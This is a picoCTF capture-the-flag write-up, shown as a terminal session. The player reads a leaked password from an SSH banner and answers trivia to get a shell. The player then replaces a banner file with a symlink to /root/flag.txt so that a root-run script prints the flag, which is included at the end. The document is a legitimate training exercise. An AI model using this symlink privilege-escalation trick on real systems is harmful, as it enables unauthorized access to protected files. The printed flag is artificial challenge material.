## Description

Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 55200`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 50728`. From the above information abuse the machine and find the flag in the /root directory.

## Silucion 
```
                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 55703
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
nc tethys.picoctf.net 59435
Protocol mismatch.
                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nctethys.picoctf.net 59435 
nctethys.picoctf.net: command not found
                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 59435
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
def con 
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
Defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
Jhon Dreper
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
John Dreper
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
Jhon Draper
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
Defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
John DRaper
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ ls /root
ls /root
flag.txt  script.py
player@challenge:~$ cat /root/flag.txt
cat /root/flag.txt
cat: /root/flag.txt: Permission denied
player@challenge:~$ cat /root/scrip.py
cat /root/scrip.py
cat: /root/scrip.py: No such file or directory
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$ ls
ls
banner  text
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt ./banner
ln -s /root/flag.txt ./banner
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ 

player@challenge:~$ ^C
                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nctethys.picoctf.net 59435 
nctethys.picoctf.net: command not found
                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 59435
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

```